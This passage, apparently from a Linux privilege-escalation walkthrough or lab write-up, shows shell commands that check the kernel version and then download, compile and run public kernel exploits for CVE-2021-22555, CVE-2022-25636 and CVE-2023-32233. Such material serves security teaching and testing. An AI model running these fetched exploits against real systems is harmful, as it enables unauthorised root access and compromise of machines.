...
```shell-session
cyberslut@ubuntu:~$ uname -r

5.10.5-051005-generic
```

```shell-session
cyberslut@ubuntu:~$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
cyberslut@ubuntu:~$ gcc -m32 -static exploit.c -o exploit
cyberslut@ubuntu:~$ ./exploit
...
```shell-session
cyberslut@ubuntu:~$ git clone https://github.com/Bonfee/CVE-2022-25636.git
cyberslut@ubuntu:~$ cd CVE-2022-25636
cyberslut@ubuntu:~$ make
cyberslut@ubuntu:~$ ./exploit
...
```shell-session
cyberslut@ubuntu:~$ git clone https://github.com/Liuk3r/CVE-2023-32233
cyberslut@ubuntu:~$ cd CVE-2023-32233
cyberslut@ubuntu:~/CVE-2023-32233$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

```shell-session
cyberslut@ubuntu:~/CVE-2023-32233$ ./exploit
